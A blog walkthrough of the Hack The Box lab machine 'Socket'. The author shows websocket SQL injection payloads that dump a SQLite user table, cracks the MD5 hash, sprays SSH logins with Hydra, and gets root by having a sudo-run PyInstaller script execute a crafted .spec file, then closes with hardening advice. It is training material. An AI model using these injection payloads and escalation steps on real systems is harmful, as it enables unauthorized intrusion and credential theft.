---
layout: post
title: Hack The Box Walkthrough - Socket
date: 2023-07-16
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/07/HTB/Socket
img: 2023/07/Socket/Socket.png
---

In Socket, I exploited an SQL Injection vulnerability in a websocket to extract the database. I used credentials found in the database to connect to the server. Finally, I ran Python code through PyInstaller to become root.

* Room: Socket
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Socket](https://app.hackthebox.com/machines/Socket)
* Author: [kavigihan](https://app.hackthebox.com/users/389926)

## Enumeration

As always, I started the machine by checking for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.206:22
Open 10.10.11.206:80
Open 10.10.11.206:5789
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

...

Nmap scan report for target (10.10.11.206)
Host is up, received syn-ack (0.045s latency).
Scanned at 2023-04-01 14:00:23 EDT for 89s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp   open  http    syn-ack Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://qreader.htb/
5789/tcp open  unknown syn-ack
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Date: Sat, 01 Apr 2023 18:00:30 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
|   Help, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Date: Sat, 01 Apr 2023 18:00:46 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|_    Failed to open a WebSocket connection: did not receive a valid HTTP request.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5789-TCP:V=7.93%I=7%D=4/1%Time=6428713D%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,F4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Sat,\x2001
SF:\x20Apr\x202023\x2018:00:30\x20GMT\r\nServer:\x20Python/3\.10\x20websoc
SF:kets/10\.4\r\nContent-Length:\x2077\r\nContent-Type:\x20text/plain\r\nC
...
SF:0valid\x20HTTP\x20request\.\n");
Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.09 seconds
```

It found three ports:
* 22 (SSH)
* 80 (HTTP)
* 5789 (Websocket)

I also checked UDP ports, but nothing interesting came up.

```bash
$ sudo nmap -sU target -v -oN nmapUdp.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-01 14:06 EDT
Initiating Ping Scan at 14:06
Scanning target (10.10.11.206) [4 ports]
Completed Ping Scan at 14:06, 0.06s elapsed (1 total hosts)
Initiating UDP Scan at 14:06
Scanning target (10.10.11.206) [1000 ports]

...

Completed UDP Scan at 14:23, 1017.10s elapsed (1000 total ports)
Nmap scan report for target (10.10.11.206)
Host is up (0.036s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1017.28 seconds
           Raw packets sent: 1200 (55.859KB) | Rcvd: 1027 (76.712KB)
```

The website on port 80 redirected to 'qreader.htb'. I added that to my hosts file and scanned it with Feroxbuster.

```bash
$ feroxbuster -u http://qreader.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o ferox80.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://qreader.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox80.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      206c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      228l      638w     6992c http://qreader.htb/
200      GET      197l      302w     4161c http://qreader.htb/report
404      GET        1l        3w       61c http://qreader.htb/api
405      GET        5l       20w      153c http://qreader.htb/embed
405      GET        5l       20w      153c http://qreader.htb/reader
403      GET        9l       28w      276c http://qreader.htb/server-status
404      GET        1l        3w       61c http://qreader.htb/api-doc
404      GET        1l        3w       61c http://qreader.htb/apis
404      GET        1l        3w       61c http://qreader.htb/api_test
404      GET        1l        3w       61c http://qreader.htb/api3
404      GET        1l        3w       61c http://qreader.htb/api2
404      GET        1l        3w       61c http://qreader.htb/api4
404      GET        1l        3w       61c http://qreader.htb/apichain
404      GET        1l        3w       61c http://qreader.htb/apit
404      GET        1l        3w       61c http://qreader.htb/api_error
404      GET        1l        3w       61c http://qreader.htb/apisphere
404      GET        1l        3w       61c http://qreader.htb/api_cache
404      GET        1l        3w       61c http://qreader.htb/apidoc
404      GET        1l        3w       61c http://qreader.htb/api7
404      GET        1l        3w       61c http://qreader.htb/apitest
404      GET        1l        3w       61c http://qreader.htb/apidocs
404      GET        1l        3w       61c http://qreader.htb/apility
404      GET        1l        3w       61c http://qreader.htb/apic
404      GET        1l        3w       61c http://qreader.htb/apiv2
404      GET        1l        3w       61c http://qreader.htb/api_client
404      GET        1l        3w       61c http://qreader.htb/apics
[####################] - 7m    119601/119601  0s      found:26      errors:27
[####################] - 7m    119601/119601  271/s   http://qreader.htb/
```

The backend seemed to catch everything that started with '/api', I scanned it again, but checking for POST requests.

```bash
$ feroxbuster -u http://qreader.htb/api/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -m GET,POST

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.5
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://qreader.htb/api/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.5
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET, POST]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        3w       61c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404     POST        1l        3w       61c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://qreader.htb/api/login
500     POST        5l       37w      265c http://qreader.htb/api/login
404      GET        0l        0w       61c http://qreader.htb/api/proj1977
[####################] - 15m   239202/239202  0s      found:3       errors:45
[####################] - 15m   239202/239202  268/s   http://qreader.htb/api/
```

It found a '/api/login/' endpoint.

I also used `wfuzz` to check for subdomains.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 28 -H "Host:FUZZ.qreader.htb" "http://qreader.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://qreader.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   400        10 L     35 W       303 Ch      "*"
000319756:   400        10 L     35 W       303 Ch      "#mail"
000415924:   400        10 L     35 W       303 Ch      "#pop3"
000488839:   400        10 L     35 W       303 Ch      "#smtp"
000588822:   400        10 L     35 W       303 Ch      "#www"

Total time: 0
Processed Requests: 648201
Filtered Requests: 648196
Requests/sec.: 0
```

It did not find anything.

## Website

I looked at the website on port 80.

![QReader Site](/assets/images/2023/07/Socket/qreaderSite.png "QReader Site")

The site allowed converting text to a QR code, and converting a QR code image back to text.

I tried sending some [Server Site Template Injection (SSTI)](https://portswigger.net/web-security/server-side-template-injection) payloads. I also tried uploading malicious files, the site only accepted images.

There was a page to report bugs from the application.

![Report page](/assets/images/2023/07/Socket/Report.png "Report Page")

I tried sending it some XSS payloads. I did not get any hit on my listener.

There was also a login endpoint in the API. I tried it for default credentials, SQL Injection, and NoSQL Injection.

```http
POST /api/login HTTP/1.1
Host: qreader.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 85

{
  "username": {
    "$ne":"aaaa"
  },
  "password": {
    "$ne":"aaaa"
  }
}
```

Nothing worked. I got authentication failure or some errors.

## Reversing

The site had links to download the application for Linux or Windows. I downloaded them and opened the Linux version in Ghidra.

![Ghidra](/assets/images/2023/07/Socket/Ghidra.png "Ghidra")

I looked at the code a little bit. I renamed a few things to make the code easier to read and looked at the strings it contained. The program was not simple, so I left it aside and tried something else.

## Websocket

While looking at the website, and the application I had completely forgotten that there was a third port that was open. But when I came back to the machine after a break, I looked at my notes again and saw it.

I tried looking at what was on port 5789 with a browser, it gave me an error.

![Websocket Error](/assets/images/2023/07/Socket/WebsocketError.png "Websocket Error")

I went through every page of the site, trying to find what was using the websocket, but I did not find anything.

I wrote a small script to access the websocket.

```python
#!/usr/bin/env python3

import websocket,json

data = {}
ws = websocket.WebSocket()
ws.connect("ws://qreader.htb:5789/")
data = str(json.dumps(data))
ws.send(data)
result = ws.recv()
print(result)
```

It told me that there were two paths I could query.

```bash
$ ./ws.py
{"paths": {"/update": "Check for updates", "/version": "Get version information"}}
```

I tried them both, they returned empty responses. I tried passing some data to them.

```python
#!/usr/bin/env python3

import websocket,json

data = {"udate": True}
data = str(json.dumps(data))

ws = websocket.WebSocket()
ws.connect("ws://qreader.htb:5789/update")
ws.send(data)
result = ws.recv()
print(result)

data = {"version": True}
data = str(json.dumps(data))
ws = websocket.WebSocket()
ws.connect("ws://qreader.htb:5789/version")
ws.send(data)
result = ws.recv()
print(result)
```

The version endpoint gave me an error about it being invalid.

```bash
$ ./ws.py

{"message": "Invalid version!"}
```

I tried a few versions, but they failed.

The website was not using the websocket anywhere I could see, so maybe the application was. I launched Wireshark to inspect the traffic, and ran the application.

The application had an 'About' menu with options to check the version, and for updates.

![About Menu](/assets/images/2023/07/Socket/AboutMenu.png "About Menu")

When I clicked on one of the options, it made some requests.

![DNS Requests](/assets/images/2023/07/Socket/DNSRequests.png "DNS Requests")

I added 'ws.qreader.htb' to my hosts file and tried again. When I clicked on 'Version', it replied that I was on version '0.0.2'.

![Version](/assets/images/2023/07/Socket/Version.png "Version")

I tried the websocket again with this version.

```python
#!/usr/bin/env python3

import websocket,json

data = {"version": '0.0.2'}
data = str(json.dumps(data))
ws = websocket.WebSocket()
ws.connect("ws://qreader.htb:5789/version")
ws.send(data)
result = ws.recv()
print(result)
```

It worked.

```bash
$ ./ws.py
{"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
```

### SQL Injection

I tried more versions. '0.0.1' worked, but not '0.0.3'. I played with the payloads. Adding a `'` did nothing, but adding a `"` gave a blank response.

I tried a simple SQL Injection.

```python
data = {"version": '0.0.2" -- -'}
```

It returned the version information.

```bash
$ ./ws.py
{"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
```

I had an SQL Injection vulnerability. I used `Order By` statements to find how many columns the query returned.

```python
data = {"version": '0.0.0" Or 1 = 1 Order By 4 desc -- -'}
```

4 columns worked, but 5 failed. Next, I tried a `UNION` statement.

```python
data = {"version": '0.0.0" UNION Select 1, 2, 3, 4 -- -'}
```

```bash
$ ./ws.py
{"message": {"id": 1, "version": 2, "released_date": 3, "downloads": 4}}
```

I knew I was able to extract data, now I needed to figure which database was used. I tried to extract the version.

```python
data = {"version": '0.0.0" UNION Select sqlite_version(), 2, 3, 4 -- -'}
```

The server was using sqlite.

```bash
$ ./ws.py
{"message": {"id": "3.37.2", "version": 2, "released_date": 3, "downloads": 4}}
```

With that information, I could use `sqlite_master` to extract the database schema. I got all the table definitions by using `Limit` and `Offset`.

```python

data = {"version": '0.0.0" UNION Select name, sql, 3, 4 From sqlite_master Limit 1 Offset 6 -- -'}
```

```sql
CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT,  answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id));

CREATE TABLE info (id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT, value TEXT);

CREATE TABLE reports (id INTEGER PRIMARY KEY AUTOINCREMENT, reporter_name TEXT, subject TEXT, description TEXT, reported_date DATE);

CREATE TABLE sqlite_sequence(name,seq);

CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password DATE, role TEXT);

CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER);
```

There was a 'users' table, so I immediately extracted its content.

```python
data = {"version": '0.0.0" UNION Select username || " - " || password || " - " || role, 2, 3, 4 From users Limit 1 Offset 0 -- -'}
```

```json
{"message": {"id": "admin - 0c090c365fa0559b151a43e0fea39710 - admin", "version": 2, "released_date": 3, "downloads": 4}}
```

There was only one user in the table. I used hashcat to crack the password.

```bash
$ hashcat -a0 -m0 hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2862/5789 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

0c090c365fa0559b151a43e0fea39710:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 0c090c365fa0559b151a43e0fea39710
Time.Started.....: Sun Apr 30 08:51:52 2023 (2 secs)
Time.Estimated...: Sun Apr 30 08:51:54 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6364.4 kH/s (0.11ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8681472/14344384 (60.52%)
Rejected.........: 0/8681472 (0.00%)
Restore.Point....: 8678400/14344384 (60.50%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: denverkm -> denissilla
Hardware.Mon.#1..: Util: 28%

Started: Sun Apr 30 08:51:51 2023
Stopped: Sun Apr 30 08:51:55 2023
```

I tried using the found password to SSH as admin, it failed. I also tried 'kavigihan' since it's the name of the box author, and it appears in the QR code that is provided as an example. That also failed.

I tried the credentials in the '/api/login' endpoint.

```http
POST /api/login HTTP/1.1
Host: qreader.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 57

{
"username":"admin",
"password": "REDACTED"
}
```

It worked, but it did not seem to get anywhere.

```http
HTTP/1.1 200 OK
Date: Sun, 30 Apr 2023 12:55:03 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: application/json
Vary: Accept-Encoding
Connection: close
Content-Length: 52

{"message":{"api_token":"None","status":"success"}}
```

I extracted the content of the other tables, hoping to find usernames or anything that could help.

```bash
data = {"version": '0.0.0" UNION Select group_concat(id || " - " || answered_by || " - " || answer, "\\n"), 2, 3, 4 From answers -- -'}

{"message": {"id": "1 - admin - Hello Json,\n\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\n\nThomas Keller\\n2 - admin - Hello Mike,\n\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\n\nThomas Keller", "version": 2, "released_date": 3, "downloads": 4}}


data = {"version": '0.0.0" UNION Select group_concat(id || " - " || key || " - " || value, "\\n"), 2, 3, 4 From info -- -'}

{"message": {"id": "1 - downloads - 1000\\n2 - convertions - 2289", "version": 2, "released_date": 3, "downloads": 4}}


data = {"version": '0.0.0" UNION Select group_concat(id || " - " || reporter_name || " - " || " - " || subject || " - " || description, "\\n"), 2, 3, 4 From reports -- -'}

{"message": {"id": "1 - Jason -  - Accept JPEG files - Is there a way to convert JPEG images with this tool? Or should I convert my JPEG to PNG and then use it?\\n2 - Mike -  - Converting non-ascii text - When I try to embed non-ascii text, it always gives me an error. It would be nice if you could take a look at this.", "version": 2, "released_date": 3, "downloads": 4}}
```

I had a few potential usernames to use with the password I cracked. I added them to a file and use Hydra to try them in SSH.


```bash
$ cat users.txt
jason
admin
json
thomaskeller
thomas
tkeller
thomask
mike

$ hydra -L users.txt -P password.txt target ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-30 09:11:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:9/p:1), ~1 try per task
[DATA] attacking ssh://target:22/
[22][ssh] host: target   login: tkeller   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-30 09:11:54
```

The password worked with the username 'tkeller'. I used it to connect and read the user flag.

```bash
$ ssh tkeller@target
tkeller@target's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-67-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

...

Last login: Sun Apr 30 13:11:12 2023 from 10.10.14.10

tkeller@socket:~$ ls
user.txt

tkeller@socket:~$ cat user.txt
REDACTED
```

## Root

Once I was on the server, getting root was easy. I looked for what I could run with sudo.

```bash
tkeller@socket:~$ sudo -l
Matching Defaults entries for tkeller on socket:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
```

I was able to run a script as anyone. I looked at the script's code.

```bash
tkeller@socket:~$ cat /usr/local/sbin/build-installer.sh
#!/bin/bash
if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
  /usr/bin/echo "No enough arguments supplied"
  exit 1;
fi

action=$1
name=$2
ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')

if [[ -L $name ]];then
  /usr/bin/echo 'Symlinks are not allowed'
  exit 1;
fi

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'make' ]]; then
  if [[ $ext == 'py' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
   /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'cleanup' ]]; then
  /usr/bin/rm -r ./build ./dist 2>/dev/null
  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
  /usr/bin/rm /tmp/qreader* 2>/dev/null
else
  /usr/bin/echo 'Invalid action'
  exit 1;
fi
```

The script was running [PyInstaller](https://pyinstaller.org/en/stable/) on a file that I had to provide. PyInstaller appears to bundle Python applications in a package. I did not know anything about it, but I thought it might execute so Python code. I created a simple file to test it.

```bash
tkeller@socket:~$ cat test.spec
import os
os.system('touch /tmp/pwn')
```

I passed the file as an argument to the script.

```bash
keller@socket:~$ sudo /usr/local/sbin/build-installer.sh build test.spec
121 INFO: PyInstaller: 5.6.2
121 INFO: Python: 3.10.6
124 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
127 INFO: UPX is not available.

tkeller@socket:~$ ls -l /tmp/pwn
-rw-r--r-- 1 root root 0 Apr 30 13:19 /tmp/pwn
```

It had created the file as root. That meant I had code execution. I changed my Python script to launch bash and ran the installer again to get root.

```bash
tkeller@socket:~$ cat test.spec
import os
os.system('/bin/bash -p')

tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build test.spec
121 INFO: PyInstaller: 5.6.2
121 INFO: Python: 3.10.6
124 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
129 INFO: UPX is not available.

root@socket:/home/tkeller# cd /root

root@socket:~# cat root.txt
REDACTED
```

## Hardening the Box

To make the server more secure, I would start by fixing the SQL Injection vulnerability.

This is the code of the 'version' endpoint.

```python
def version(app_version):

    data = fetch_db(f'SELECT * from versions where version = "{app_version}"')

    if len(data) == 0:
        return False, f'Invalid version!'

    version_info = {}

    for row in data:
        for k in row.keys():
            version_info[k] = row[k]

    return True, version_info
```

This code appends data provided by the user directly in the query. It should have used [placeholders](https://docs.python.org/3/library/sqlite3.html#how-to-use-placeholders-to-bind-values-in-sql-queries) for the data and provide the values as a tuple.

The websocket was used by the application running on the server. It might have been a good idea to only open the port for local calls and reduce the attack surface.

The password for tkeller was reused. It was used for the web application, and for the user on the server. Those should have been two different passwords. Also, it was hashed with MD5. It took hashcat 4 seconds to crack it.

The last issue was the installation script. It allowed running any Python code. This might be necessary if tkeller needs to install packages. In this case, a password should have been required to run sudo. And to the previous point, the password used should have been secure. Not something that was in a breach from 2009, and that is reused on any website. Especially not one that uses MD5.